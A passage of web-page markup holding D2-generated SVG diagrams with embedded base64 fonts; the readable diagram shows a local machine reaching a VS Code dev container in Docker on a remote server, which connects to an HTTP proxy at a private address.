lqk2betqM0aZW7rTa/0qetcLlKwrptXDKc1lszfWbl3YEVMaS1DbtfUSVX1fa3pzA1XPPXs7gm4NfQpfiMZXqGr6rXqmvprDovq8flyy34Gyvo3hq9P8RhnRX4Ky/n6NqdeBbRBR8HvZPjO/YWZFa1XjJuWw12SFc9zT0ybtHnluamxqEX6ZUNcq1LVGgUc/UpVq85vEXosqJX2fpjVzY3qj7uko7AL9Ktlyb8FevZpm/Xbze2TD2cFbNWnvvtfYSqZ+iBsUmDSVir2Ungoz+vtZ09XwrmlsZN/oT7tSvfVLZUMVj+rb3l6T9tputku/Ztor47Lrqr2Z3Yo74866fpd3A67ffRvvMu0zlNzHeJfDu7/gXR7vTrqMy7sed8H1uow75XIu7zJKedfrcoFV5JJyv2qd0R2n3YfBijzccmV+y5UVPe+sy66d4LJKZ13O9bk+l3MXXI+uZtww3vW6sy7jBoJxswfV7wuq0+tOu3NuIFR3p12/63OXm73oBlzOnXH97n3VGGw5s9v1uMHAs2Yvbro39OCk63I97qTrdv1hppr9uKUfJ91pl3G9ek6/RpUJVJuduYVfPVaRUxp/sGfA9QQZae21jXUO+uGNNdqQb7XY0B1v1JnfrDPeaLHyPwAAAP//AQAA//+blbgHAAMAAAAAAAD/tQAyAAAAAQAAAAAAAAAAAAAAAAAAAAA=)}.d2-791276444 .text-mono-bold{font-family:'d2-791276444-font-mono-bold'}@font-face{font-family:d2-791276444-font-mono-bold;src:url(data:application/font-woff;base64,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)}@font-face{font-family:d2-791276444-font-mono-italic;src:url(data:application/font-woff;base64,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)}.connection,.shape{stroke-linejoin:round}.shape{shape-rendering:geometricPrecision}.connection{stroke-linecap:round}.d2-791276444 .fill-N1{fill:#000410}.d2-791276444 .fill-B6{fill:#fff}.d2-791276444 .stroke-B1{stroke:#000410}.dots-overlay{fill:url(#dots);mix-blend-mode:multiply}</style><defs><pattern id="dots" width="15" height="15" x="0" y="0" patternUnits="userSpaceOnUse"><path fill="#0A0F25" d="M2 2h1v1H2zM12 2h1v1h-1zM12 12h1v1h-1zM2 12h1v1H2zM2 7h1v1H2zM12 7h1v1h-1zM7 2h1v1H7zM7 12h1v1H7zM7 7h1v1H7z" opacity=".1" style="mix-blend-mode:multiply"/></pattern></defs><g id="local"><g class="shape"><path fill="#FFF" stroke="#000410" d="M0 147h92v66H0z" class="stroke-B1 fill-B6" style="stroke-width:2"/></g><text x="46" y="185.5" fill="#000410" class="text-mono-bold fill-N1" style="text-anchor:middle;font-size:16px">LOCAL</text></g><g id="remote"><g class="shape"><path stroke="#000410" d="M232 76h345v197H232z" class="stroke-B1" style="fill:#e7e9ee;stroke-width:2"/><path d="M232 76h345v197H232z" class="dots-overlay" style="stroke-width:2"/><path fill="transparent" stroke="#000410" d="M237 81h335v187H237z" class="stroke-B1" style="stroke-width:2"/></g><text x="404.5" y="63" fill="#000410" class="text-mono fill-N1" style="text-anchor:middle;font-size:28px">REMOTE SERVER</text></g><g id="proxy"><g class="shape"><path fill="#FFF" stroke="#000410" d="M724 147h293v66H724z" class="stroke-B1 fill-B6" style="stroke-width:2"/></g><text x="870.5" y="185.5" fill="#000410" class="text-mono-bold fill-N1" style="text-anchor:middle;font-size:16px">HTTP://192.168.9.100:11451</text></g><g id="remote.docker"><g class="shape"><path stroke="#000410" d="M262 117h285v126H262z" class="stroke-B1" style="fill:#f5f6f9;stroke-width:2"/><path d="M262 117h285v126H262z" class="dots-overlay" style="stroke-width:2"/></g><text x="404.5" y="105" fill="#000410" class="text-mono fill-N1" style="text-anchor:middle;font-size:24px">DOCKER</text></g><g id="remote.docker.code"><g class="shape"><path fill="#FFF" stroke="#000410" d="M292 147h225v66H292z" class="stroke-B1 fill-B6" style="stroke-width:2"/></g><text x="404.5" y="185.5" fill="#000410" class="text-mono-bold fill-N1" style="text-anchor:middle;font-size:16px">VS CODE (CONTAINER)</text></g><g id="(local -&gt; remote.docker.code)[0]"><marker id="mk-3488378134" markerHeight="12" markerUnits="userSpaceOnUse" markerWidth="10" orient="auto" refX="7" refY="6" viewBox="0 0 10 12"><path stroke-width="2" d="m0 0 10 6-10 6z" class="connection" style="fill:#000410"/></marker><path fill="none" stroke="#000410" marker-end="url(#mk-3488378134)" d="M94 180h194" class="connection stroke-B1" mask="url(#d2-791276444)" style="stroke-width:2"/></g><g id="(remote.docker.code -&gt; proxy)[0]"><path fill="none" stroke="#000410" marker-end="url(#mk-3488378134)" d="M519 180h201.5" class="connection stroke-B1" mask="url(#d2-791276444)" style="stroke-width:2"/><text x="620.5" y="186" style="font-family:'d2-791276444-font-mono-italic';fill:#0000b8;text-anchor:middle;font-size:16px">?</text></g><mask id="d2-791276444" width="1019" height="239" x="-1" y="35" maskUnits="userSpaceOnUse"><path fill="#fff" d="M-1 35h1019v239H-1z"/><path fill="rgba(0,0,0,0.75)" d="M22.5 169.5h47v21h-47zM296.5 35h216v36h-216zM746.5 169.5h248v21h-248zM362 81h85v31h-85zM314.5 169.5h180v21h-180z"/><path d="M617 170h7v21h-7z"/></mask></svg></svg></figure><figure class="d2"><svg xmlns="http://www.w3.org/2000/svg" width="416" height="118" preserveAspectRatio="xMinYMin meet" viewBox="0 0 594 168"><svg id="d2-svg" width="594" height="168" class="d2-1627946911" viewBox="19 15 594 168"><rect width="594" height="168" x="19" y="15" stroke-width="0" rx="0" style="fill:#fff"/><style>@font-face{font-family:d2-1627946911-font-mono;src:url(data:application/font-woff;base64,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